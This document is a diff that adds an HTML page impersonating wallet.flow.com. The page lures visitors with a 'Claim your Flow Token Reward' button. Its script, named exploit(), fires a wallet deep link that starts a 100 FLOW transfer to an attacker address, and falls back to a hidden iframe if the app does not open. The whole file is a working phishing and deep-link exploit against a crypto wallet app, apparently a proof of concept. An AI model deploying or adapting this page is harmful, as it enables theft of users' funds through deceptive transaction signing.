@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>wallet.flow.com</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; }
+       .btn { 
+            background-color: #00ef8b; color: white; padding: 20px 40px; 
+            font-size: 20px; border: none; border-radius: 10px; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>Claim your Flow Token Reward</h1>
+    <p>Click the button below to sign the claim transaction.</p>
+    <button class="btn" onclick="exploit()">CLAIM REWARD</button>
+
+    <script>
+        function exploit() {
+            // The attacker constructs a URI that looks like a claim 
+            // but is actually a transfer to the attacker.
+            // Address: 0x123... (Attacker)
+            // Amount: 100.0 FLOW
+            const maliciousUri = "frw://transaction?address=0x7633dd5442de3463&amount=100.0";
+            
+            // Trigger the Deep Link
+            window.location.href = maliciousUri;
+            
+            // Fallback: If the app doesn't open immediately, try an iframe approach
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = maliciousUri;
+                document.body.appendChild(iframe);
+            }, 500);
+        }
+    </script>
+</body>
+</html>
